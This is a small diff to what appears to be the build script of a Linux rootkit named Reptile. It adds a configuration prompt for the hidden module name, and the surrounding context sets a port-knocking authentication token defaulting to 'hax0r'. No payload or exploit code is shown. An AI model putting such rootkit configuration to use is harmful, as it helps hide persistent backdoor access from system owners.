@@ -341,6 +341,9 @@ function reptile_remove {
 function client_build {
 	banner
 
+	load_config "Hide name" "reptile"
+	MODULE=$RETVAL
+
 	load_config "Auth token to port-knocking" "hax0r"
 	TOKEN=$RETVAL
 	
